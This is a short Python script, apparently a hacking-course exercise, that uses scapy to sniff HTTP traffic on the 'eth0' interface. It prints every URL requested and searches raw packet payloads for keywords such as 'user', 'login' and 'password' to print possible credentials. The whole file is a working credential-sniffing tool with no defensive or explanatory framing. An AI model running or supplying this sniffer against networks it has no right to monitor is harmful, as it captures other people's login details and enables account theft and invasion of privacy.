#! /usr/bin/env python

import scapy.all as scapy
from scapy.layers import http
def sniffing(interface):
    scapy.sniff(iface=interface, store=False, prn=display_packet)

def get_url(packet):
    url = packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
    return url

def get_login(packet):
    if packet.haslayer(scapy.Raw):
        keywords = ["usrrname","user","login","password","pass"]
        load = str(packet[scapy.Raw].load)
        for key in keywords:
            if key in load:
                return load

def display_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        url = get_url(packet)
        print("[+]URL Accessed >> " + str(url))
        login=get_login(packet)
        if login:
            print("\n\n[+]Possible login info" + str(login) + "\n\n")

sniffing("eth0")

